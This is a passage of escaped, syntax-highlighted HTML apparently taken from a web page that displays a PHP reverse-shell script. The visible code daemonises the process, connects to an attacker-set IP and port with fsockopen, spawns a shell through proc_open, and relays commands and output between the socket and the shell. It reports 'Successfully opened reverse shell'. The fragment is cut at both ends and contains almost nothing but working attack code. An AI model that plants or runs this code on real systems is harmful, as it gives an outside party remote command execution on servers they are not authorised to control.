class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;pcntl_fork\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003e$pid\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003epcntl_fork\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$pid\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nx\"\u003eprintit\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;ERROR: Can\u0026#39;t fork\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"k\"\u003eexit\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$pid\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"k\"\u003eexit\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eposix_setsid\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nx\"\u003eprintit\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;Error: Can\u0026#39;t setsid()\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"k\"\u003eexit\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003e$daemon\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e \u003cspan class=\"k\"\u003eelse\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nx\"\u003eprintit\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;WARNING: Failed to daemonise. This is quite common and not fatal.\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nx\"\u003echdir\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;/\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nx\"\u003eumask\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003e$sock\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003efsockopen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$ip\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$port\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$errno\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$errstr\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e30\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"o\"\u003e!\u003c/span\u003e\u003cspan class=\"nv\"\u003e$sock\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nx\"\u003eprintit\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"si\"\u003e$errstr\u003c/span\u003e\u003cspan class=\"s2\"\u003e (\u003c/span\u003e\u003cspan class=\"si\"\u003e$errno\u003c/span\u003e\u003cspan class=\"s2\"\u003e)\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003eexit\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003e$descriptorspec\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003earray\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e   \u003cspan class=\"mi\"\u003e0\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"k\"\u003earray\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;pipe\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;r\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e),\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e   \u003cspan class=\"mi\"\u003e1\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"k\"\u003earray\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;pipe\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;w\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e),\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e   \u003cspan class=\"mi\"\u003e2\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"k\"\u003earray\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;pipe\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;w\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003e$process\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003eproc_open\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$shell\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$descriptorspec\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$pipes\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"o\"\u003e!\u003c/span\u003e\u003cspan class=\"nx\"\u003eis_resource\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$process\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nx\"\u003eprintit\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;ERROR: Can\u0026#39;t spawn shell\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003eexit\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nx\"\u003estream_set_blocking\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$pipes\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e],\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nx\"\u003estream_set_blocking\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$pipes\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e],\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nx\"\u003estream_set_blocking\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$pipes\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e2\u003c/span\u003e\u003cspan class=\"p\"\u003e],\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nx\"\u003estream_set_blocking\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$sock\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nx\"\u003eprintit\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;Successfully opened reverse shell to \u003c/span\u003e\u003cspan class=\"si\"\u003e$ip\u003c/span\u003e\u003cspan class=\"s2\"\u003e:\u003c/span\u003e\u003cspan class=\"si\"\u003e$port\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003ewhile\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003efeof\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$sock\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nx\"\u003eprintit\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;ERROR: Shell connection terminated\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"k\"\u003ebreak\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003efeof\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$pipes\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e]))\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nx\"\u003eprintit\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;ERROR: Shell process terminated\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"k\"\u003ebreak\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003e$read_a\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003earray\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$sock\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$pipes\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e],\u003c/span\u003e \u003cspan class=\"nv\"\u003e$pipes\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e2\u003c/span\u003e\u003cspan class=\"p\"\u003e]);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003e$num_changed_sockets\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003estream_select\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$read_a\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$write_a\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$error_a\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"k\"\u003enull\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ein_array\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$sock\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$read_a\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$debug\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"nx\"\u003eprintit\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;SOCK READ\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nv\"\u003e$input\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003efread\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$sock\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$chunk_size\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$debug\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"nx\"\u003eprintit\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;SOCK: \u003c/span\u003e\u003cspan class=\"si\"\u003e$input\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nx\"\u003efwrite\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$pipes\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e],\u003c/span\u003e \u003cspan class=\"nv\"\u003e$input\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ein_array\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$pipes\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e],\u003c/span\u003e \u003cspan class=\"nv\"\u003e$read_a\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$debug\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"nx\"\u003eprintit\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;STDOUT READ\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nv\"\u003e$input\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003efread\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$pipes\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e],\u003c/span\u003e \u003cspan class=\"nv\"\u003e$chunk_size\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$debug\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"nx\"\u003eprintit\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;STDOUT: \u003c/span\u003e\u003cspan class=\"si\"\u003e$input\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nx\"\u003efwrite\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$sock\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$input\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ein_array\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$pipes\u003c/span\u003e\u003cspan 